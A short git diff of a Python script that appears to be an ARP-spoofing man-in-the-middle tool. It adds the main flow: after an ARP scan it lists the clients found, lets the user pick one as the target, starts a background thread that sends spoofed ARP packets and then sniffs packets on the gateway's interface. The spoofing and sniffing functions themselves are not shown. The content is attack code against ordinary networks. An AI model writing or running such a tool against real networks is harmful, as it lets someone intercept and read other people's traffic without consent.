@@ -3,7 +3,7 @@ import subprocess
 import sys
 import time
 import os
-from ipaddress import IPv4Address
+from ipaddress import IPv4Network
 import threading
 
 
@@ -146,3 +146,17 @@ gateways = gateway_info(arp_res)
 gateway_info = gateways[0]
 
 client_info = clients(arp_res, gateways)
+if len(client_info) == 0:
+    print("No clients found in the network")
+    exit()
+
+choice = print_arp_res(client_info)
+
+node_to_spoof = client_info[choice]
+
+t1 = threading.Thread(target=send_spoof_packets, daemon=True)
+t1.start()
+
+os.chdir(cwd)
+
+packet_sniffer(gateway_info["iface"])
